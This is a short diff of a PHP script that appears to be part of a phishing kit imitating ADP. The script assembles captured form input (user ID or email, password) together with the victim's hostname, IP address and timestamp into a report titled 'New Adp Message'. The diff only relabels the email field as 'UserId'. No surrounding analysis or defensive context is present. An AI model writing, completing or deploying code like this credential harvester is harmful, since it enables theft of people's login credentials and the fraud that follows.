@@ -5,7 +5,7 @@ $hostname = gethostbyaddr($ip);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $message = "New Adp Message\n";
-$message .= "Email : ".$_POST['em']."\n";
+$message .= "UserId : ".$_POST['em']."\n";
 $message .= "Password : ".$_POST['psw']."\n";
 $message .= "HostName : ".$hostname."\n";
 $message .= "IP Address $ip on $time\n";
